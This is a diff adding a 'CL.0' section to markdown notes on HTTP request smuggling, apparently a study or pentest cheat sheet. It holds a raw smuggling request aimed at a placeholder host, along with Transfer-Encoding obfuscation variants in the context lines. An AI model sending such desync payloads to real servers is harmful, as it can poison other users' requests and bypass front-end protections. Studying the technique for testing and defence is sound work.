@@ -84,3 +84,18 @@ X: X[\n]Transfer-Encoding: chunked
 Transfer-Encoding
 : chunked
 ```
+
+## CL.0
+- Front-end uses the **Content-Length** header and backend ignores it (treating it as having a value of 0 and treating the body as the next request).
+- Transfer-Encoding header is useless as it is ignored by both frontend and backend servers.
+
+```
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 3
+
+xyzGET / HTTP/1.1
+Host: vulnerable-website.com
+```
+
+The next request should give a **405 Method Not Allowed** as the backend will process the request with **xyzGET** method. 
